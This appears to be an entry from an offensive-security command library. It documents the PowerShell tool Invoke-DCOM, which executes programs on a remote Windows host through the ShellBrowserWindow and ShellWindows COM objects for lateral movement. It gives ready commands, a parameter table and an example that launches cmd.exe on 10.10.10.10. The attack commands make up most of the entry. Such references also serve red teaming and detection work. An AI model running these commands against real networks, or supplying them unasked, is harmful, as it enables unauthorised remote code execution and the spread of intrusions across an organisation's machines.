---
type: command
executor: powershell
data: >-
  Invoke-DCOM -ComputerName TARGET_HOST -Method ShellBrowserWindow -Command
  "calc.exe"; Invoke-DCOM -ComputerName TARGET_HOST -Method ShellWindows
  -Command "calc.exe"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - dcom
verified: true
validated: true
---

# Invoke DCOM Start Calc Shell Methods

## Command

```powershell
Invoke-DCOM -ComputerName TARGET_HOST -Method ShellBrowserWindow -Command "calc.exe"
Invoke-DCOM -ComputerName TARGET_HOST -Method ShellWindows -Command "calc.exe"
```

## Description

Executes calc.exe using ShellBrowserWindow and ShellWindows COM objects for lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ComputerName TARGET_HOST | Target | Yes |
| -Method ShellBrowserWindow | COM method | Yes |
| -Command "calc.exe" | Executable | Yes |

## Examples

### Basic

```powershell
Invoke-DCOM -ComputerName 10.10.10.10 -Method ShellWindows -Command "cmd.exe"
```

## Expected Output

No output on success; check target processes for calc.exe.

## Related

- [[procedures/dcom-lateral-movement]]
- [[tools/Invoke-DCOM]]
